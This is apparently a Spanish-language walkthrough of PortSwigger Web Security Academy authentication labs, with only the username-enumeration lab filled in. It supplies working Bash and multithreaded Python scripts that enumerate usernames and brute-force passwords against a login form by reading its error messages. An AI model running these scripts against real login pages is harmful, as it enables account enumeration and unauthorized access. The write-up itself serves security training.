# Authentication (Labs)

### Username enumeration via different responses

En este caso tenemos que intentar enumerar los usuarios que existen y a continuación la contraseña de dicho/s usuario/s.

Lo primero es comprobar si existe alguna vía para poder enumerar los usuarios, en este caso cuando el usuario es incorrecto te avisa la propia web con un mensaje de "Invalid username" así que podemos realizar un ataque de fuerza bruta para poder conseguir los usuarios válidos.

Podríamos hacerlo a través de enviar la petición de inicio de sesión al intruder de Burpsuite, pero en mi caso cómo tengo el community y es lento cómo el caballo del malo voy a hacer un poco de scripting.

Es sencillo, enviar una petición POST de login iterando en un diccionario de usuarios "Proporcionado por el propio ejercicio" y filtrar los resultados correctos mediante el mensaje de error que nos da la propia web.

En Bash lo haríamos de la siguiente forma:

```
#!/bin/bash

URL="https://ac2f1f351fdb30c8c0f030cf00910092.web-security-academy.net/login"

while read -r i; do
        no_valido=$(curl -s -d "username=$i&password=asd" $URL | grep -oP Invalid)
        if [ "$no_valido" != "Invalid" ]; then
                echo $i
        fi
        no_valido=""
done < usuarios
```

Y ahora hacemos algo similar pero para las contraseñas, podemos mejorar un poco nuestro script ya que seguramente lo utilizaremos en otros laboratorios de PortSwigger.

En Bash:

```
#!/bin/bash

URL="https://ac2f1f351fdb30c8c0f030cf00910092.web-security-academy.net/login"

usuarios_bf () {
	while read -r i; do
		no_valido=$(curl -s -d "username=$i&password=asd" $URL | grep -oP Invalid)
		if [ "$no_valido" != "Invalid" ]; then
			echo $i
		fi
		no_valido=""
	done < usuarios
}

pass_bf () {
usuario_correcto="ar"
        while read -r i; do
                no_valido=$(curl -s -d "username=$usuario_correcto&password=$i" $URL | grep -oP Incorrect)
                if [ "$no_valido" != "Incorrect" ]; then
                        echo $i
			no_valido=""
			break
                fi
                no_valido=""
        done < pass
}

if [ "$1" == "user" ]; then
	usuarios_bf
elif [ "$1" == "pass" ]; then
	pass_bf
else
	echo -e "Utiliza user o pass en función de si quieres realizar fuerza bruta en uno u otro\nEjemplo: fuerzabruta.sh user"
fi

```

En Python:

```
#!/usr/bin/python3

import argparse
import requests
from pwn import *
from bs4 import BeautifulSoup

def lista(archivo):
	f = open("%s" % archivo)
	temp = f.read().splitlines()
	f.close()
	return temp

def comprobar(usuario,passw,valor):
	data_post = {
		'username': usuario,
		'password': passw
	}
	content = requests.post(url, data=data_post)
	soup = BeautifulSoup(content.text, 'html.parser')
	soup2 = soup.find("p", class_="is-warning")
	if soup2 is None:
		return 1
	else:
		valor_grep = soup2.get_text()
		if valor_grep != valor:
			return 1

def usuarios_bf ():
	lista_usuarios = lista("usuarios")
	for i in lista_usuarios:
		p1.status("%s" % i)
		if comprobar("%s" % i,"asd","Invalid username"):
			log.info("%s" % i)

def pass_bf ():
	lista_usuarios = lista("pass")
	for i in lista_usuarios:
		p1.status("%s" % i)
		if comprobar("%s" % usuario_correcto,"%s" % i,"Incorrect password"):
			log.info("%s" % i)
			break

#Marcamos los argumentos
parser = argparse.ArgumentParser(description='Programa para hacer BruteForce en PortSwigger.', add_help=False)
parser.add_argument("-h", "--help", action='help', default=argparse.SUPPRESS, help='Muestra la ayuda')
grupo = parser.add_mutually_exclusive_group()
grupo.add_argument("-u", "--usuarios", help="Realiza Brute Force sobre Usuarios", action="store_true")
grupo.add_argument("-p", "--passwords", help="Realiza Brute Force sobre contraseñas", action="store_true")
parser.add_argument("-U", "--url", help="Introduce la URL", required=True)
parser.add_argument("-c", "--correctuser", help="Introduce un usuario correcto para sacar la contraseña")
args = parser.parse_args()

url = args.url
if args.usuarios:
	p1 = log.progress("Usuarios")
	usuarios_bf()
elif args.passwords:
	if args.correctuser is None:
		parser.error('Se requiere un usuario correcto')
	else:
		usuario_correcto = args.correctuser
		p1 = log.progress("Contraseñas")
		pass_bf()
else:
	print('Utiliza -h o --help para ver el mensaje de Ayuda')
```

#### AÑADIDO

Me he puesto a aprender a hacer MultiThreading en Python y maravillosamente he conseguido que el script de Python que en este ejercicio tardaba 24 segundos en acabar tarde menos de un segundo, únicamente milésimas:

```
#!/usr/bin/python3

import argparse
import requests
from pwn import *
from bs4 import BeautifulSoup
from threading import Thread
from queue import Queue

def def_handler(sig, frame):
	log.failure("Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Worker(Thread):
    """ Thread executing tasks from a given tasks queue """

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                # An exception happened in this thread
                print(e)
            finally:
                # Mark this task as done, whether an exception happened or not
                self.tasks.task_done()

class ThreadPool:
    """ Pool of threads consuming tasks from a queue """

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """ Add a task to the queue """
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        """ Add a list of tasks to the queue """
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        """ Wait for completion of all the tasks in the queue """
        self.tasks.join()

def lista(archivo):
	f = open("%s" % archivo)
	temp = f.read().splitlines()
	f.close()
	return temp


def comprobar(usuario, passw, valor):
	p1.status("%s" % usuario)
	p2.status("%s" % passw)
	data_post = {
		'username': usuario,
		'password': passw
	}
	content = requests.post(url, data=data_post)
	soup = BeautifulSoup(content.text, 'html.parser')
	soup2 = soup.find("p", class_="is-warning")
	if soup2 is None:
		log.info("La prueba ha sido correcta con usuario %s y contraseña %s" % (usuario, passw))
	else:
		valor_grep = soup2.get_text()
		if valor_grep != valor:
			log.info("La prueba ha sido correcta con usuario %s y contraseña %s" % (usuario, passw))

def usuarios_bf ():
	lista_usuarios = lista("usuarios")
	pool = ThreadPool(20)
	for i in lista_usuarios:
		pool.add_task(comprobar, i, "asd", "Invalid username")
	pool.wait_completion()

def pass_bf ():
	lista_pass = lista("pass")
	pool = ThreadPool(20)
	for i in lista_pass:
		pool.add_task(comprobar, usuario_correcto, i, "Incorrect password")
	pool.wait_completion()

#Marcamos los argumentos
parser = argparse.ArgumentParser(description='Programa para hacer BruteForce en PortSwigger.', add_help=False)
parser.add_argument("-h", "--help", action='help', default=argparse.SUPPRESS, help='Muestra la ayuda')
grupo = parser.add_mutually_exclusive_group()
grupo.add_argument("-u", "--usuarios", help="Realiza Brute Force sobre Usuarios", action="store_true")
grupo.add_argument("-p", "--passwords", help="Realiza Brute Force sobre contraseñas", action="store_true")
parser.add_argument("-U", "--url", help="Introduce la URL", required=True)
parser.add_argument("-c", "--correctuser", help="Introduce un usuario correcto para sacar la contraseña")
args = parser.parse_args()

url = args.url
p1 = log.progress("Usuarios")
p2 = log.progress("Contraseñas")
if args.usuarios:
	usuarios_bf()
elif args.passwords:
	if args.correctuser is None:
		parser.error('Se requiere un usuario correcto')
	else:
		usuario_correcto = args.correctuser
		pass_bf()
else:
	print('Utiliza -h o --help para ver el mensaje de Ayuda')

```

Aún podrían añadirse argumentos para seleccionar el número de hilos, podríamos mandar mensajes de error cuando estuviésemos haciendo más peticiones de las soportadas y un largo etc... Pero no quiero crear un nuevo Hydra ;)

### Username enumeration via subtly different responses

### Username enumeration via response timing

### Broken brute-force protection, IP block

### Username enumeration via account lock

### Broken brute-force protection, multiple credentials per request

### 2FA simple bypass

### 2FA broken logic

### 2FA bypass using a brute-force attack

### Brute-forcing a stay-logged-in cookie

### Offline password cracking

### Password reset broken logic

### Password reset poisoning via middleware

### Password brute-force via password change
